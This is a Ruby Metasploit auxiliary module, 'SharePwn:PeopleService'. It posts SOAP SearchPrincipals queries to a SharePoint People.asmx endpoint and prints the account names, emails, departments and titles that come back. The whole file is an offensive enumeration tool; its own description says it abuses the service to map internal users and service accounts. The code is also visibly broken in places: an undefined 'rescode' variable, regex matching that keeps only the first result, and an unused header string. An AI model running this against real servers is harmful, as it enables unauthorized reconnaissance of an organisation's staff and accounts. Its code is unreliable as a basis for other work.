##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/http'
require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'   		=> 'SharePwn:PeopleService - SharePoint Network/Account Enumeration',
      'Description'	=> %q{
        This SharePwn module abuses the functionality of the People.asmx service in order to identify usernames,
        computer names, and service accounts that exist within the target internal network.
      },
      'Author' 		=> 'J Parsons "0rigen" <0rigen [at] 0rigen.net>',
      'License'		=> MSF_LICENSE)
    )

    register_options(
      [
        OptString.new('PATH', [ false,  "The target's SharePoint path, if not at webroot", '/']),
        OptString.new('SEARCHSTRING', [true, "Text to search for", '$']),
        OptString.new('RESULTS', [true, "Number of results to request", '100']),
        OptString.new('SOAPVERSION', [true, "SOAP Version to use (1.1 or 1.2)", '1.1']),
        Opt::RPORT(80)
      ], self.class)

    deregister_options('THREADS')

  end

  def run
    connect

    tpath = normalize_uri(datastore['PATH'])

    if (tpath[-1,1] != '/')
      tpath += '/'
    end
    if (tpath == '/')
      tpath =""
    end

    tpath = tpath + "/_vti_bin/People.asmx"

    prot  = datastore['SSL'] ? 'https' : 'http'

    r = build_request

    if(datastore['SOAPVERSION'].to_s == '1.2')
      print_status("Requesting " + tpath)
      res = send_request_cgi({
        'uri'     =>  tpath,
        'method'    => 'POST',
        'ctype'   => 'text/xml; charset=utf-8',
        'data' => r
      }, 20)
    end

    # SOAP 1.1 Requires an additional SOAPAction header
    if(datastore['SOAPVERSION'].to_s != '1.2')
      print_status("Requesting " + tpath)
      res = send_request_cgi({
        'uri'      =>  tpath,
        'headers' => { 'SOAPAction' => "http://schemas.microsoft.com/sharepoint/soap/SearchPrincipals" },
        'method'     => 'POST',
        'ctype'    => 'text/xml; charset=utf-8',
        'data' => r
      }, 20)
    end

    if (res.code.to_s == '404')
      print_error("Got HTTP Code <" + res.code.to_s + " Not Found>.  Check your URL and SharePoint Path. ")
      #return
    end
    if (res.code.to_s == '401') or (res.code.to_s == '403')
      print_error("Got HTTP Code <" + res.code.to_s + ">  You're going to need credentials.")
      #return
    end

    if (res.code.to_s == '200') # Success!
      print_status("Got HTTP Code <" + rescode.to_s + ">  Request was successful!")
      # Parse the result
      parse_result(res.get_xml_document)
    end

  end

  #
  # Parse a successful response for user information
  #
  def parse_result(res)
    account_names = []
    user_ids = []
    display_names = []
    emails = []
    departments = []
    titles = []

    # Parse for results
    if (res =~ /<AccountName>([^<].*[^>])<\/AccountName>/)
      account_names = res.match(/<AccountName>([^<].*[^>])<\/AccountName>/).to_a
    end
    if (res =~ /<UserInfoID>([^<].*[^>])<\/UserInfoID>/)
      user_ids = res.match(/<UserInfoID>([^<].*[^>])<\/UserInfoID>/).to_a
    end
    if (res =~ /<DisplayName>([^<].*[^>])<\/DisplayName>/)
      display_names = res.match(/<DisplayName>([^<].*[^>])<\/DisplayName>/).to_a
    end
    if (res =~ /<Email>([^<].*[^>])<\/Email>/)
      emails = res.match(/<Email>([^<].*[^>])<\/Email>/).to_a
    end
    if (res =~ /<Department>([^<].*[^>])<\/Department>/)
      departments = res.match(/<Department>([^<].*[^>])<\/Department>/).to_a
    end
    if (res =~ /<Title>([^<].*[^>])<\/Title>/)
      titles = res.match(/<Title>([^<].*[^>])<\/Title>/).to_a
    end

    # Make sure we found anything before movign on...
    if ( user_ids.length > 0 )
      i = 1
      while i < user_ids.length
        print_status("***Finding " + i.to_s + " ***")
        print_status("User ID: " + user_ids[i]) unless (not user_ids[i])
        print_status("Account Name: " + account_names[i]) unless (not account_names[i])
        print_status("Display Name: " + display_names[i]) unless (not display_names[i])
        print_status("Email: " + emails[i]) unless (not emails[i])
        print_status("Department: " + departments[i]) unless (not departments[i])
        print_status("Title: " + titles[i]) unless (not titles[i])
        i+=1
      end
    end

  end


  #
  #  Create XML POST Payload
  #
  def build_request
    xml = ""

    oneone_header = 'SOAPAction: "http://schemas.microsoft.com/sharepoint/soap/ResolvePrincipals'
    oneone = %q{
              <?xml version="1.0" encoding="utf-8"?>
              <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
                <soap:Body>
                  <SearchPrincipals xmlns="http://schemas.microsoft.com/sharepoint/soap/">
                    <searchText>{{searchText}}</searchText>
                    <maxResults>{{maxRes}}</maxResults>
                    <principalType>All</principalType>
                  </SearchPrincipals>
                </soap:Body>
              </soap:Envelope>
              }

    onetwo = %q{
            <?xml version="1.0" encoding="utf-8"?>
            <soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://www.w3.org/2003/05/soap-envelope">
              <soap12:Body>
                <SearchPrincipals xmlns="http://schemas.microsoft.com/sharepoint/soap/">
                  <searchText>{{searchText}}</searchText>
                  <maxResults>{{maxRes}}</maxResults>
                  <principalType>All</principalType>
                </SearchPrincipals>
              </soap12:Body>
            </soap12:Envelope>
            }

    if (datastore['SOAPVERSION'] == '1.2')
      xml = onetwo
    end
    if (datastore['SOAPVERSION'] == '1.1')
      xml = oneone
    end

    # Replace {{ID}} fields with user-defined options
    xml ["{{searchText}}"] = datastore['SEARCHSTRING']
    xml ["{{maxRes}}"] = datastore['RESULTS'].to_s

    # Return the data
    xml

  end #end build_request

end #end class